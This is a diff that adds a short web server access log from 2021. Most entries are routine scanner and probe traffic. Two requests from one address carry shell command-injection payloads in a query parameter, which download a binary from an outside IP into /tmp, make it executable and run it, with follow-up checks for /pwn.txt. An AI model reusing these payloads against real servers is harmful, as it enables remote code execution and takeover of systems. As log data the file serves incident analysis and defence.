@@ -1,0 +1,8 @@
+::1 - - [31/Aug/2021:16:00:01 +0000] "GET /birthday/remind HTTP/1.1" 200 208 "-" "curl/7.29.0"
+::ffff:213.202.230.103 - - [31/Aug/2021:23:03:15 +0000] "GET /api/getServices?name[]=$(curl%20-O%20http://155.94.178.138:8081/syn) HTTP/1.1" 404 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+::ffff:213.202.230.103 - - [31/Aug/2021:23:03:16 +0000] "GET /pwn.txt HTTP/1.1" 404 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+::ffff:213.202.230.103 - - [31/Aug/2021:23:05:29 +0000] "GET /api/getServices?name[]=$(cd%20/tmp;curl%20-O%20http://155.94.178.138:8081/syn;chmod%20777%20syn;./syn) HTTP/1.1" 404 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+::ffff:213.202.230.103 - - [31/Aug/2021:23:05:29 +0000] "GET /pwn.txt HTTP/1.1" 404 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+::ffff:185.180.143.145 - - [01/Sep/2021:05:02:41 +0000] "GET / HTTP/1.1" 404 1022 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
+::ffff:92.118.161.29 - - [01/Sep/2021:07:31:10 +0000] "GET / HTTP/1.0" 404 1022 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
+::ffff:47.241.185.192 - - [01/Sep/2021:11:18:06 +0000] "GET http://passport.baidu.com/ HTTP/1.1" 404 1022 "-" "-"
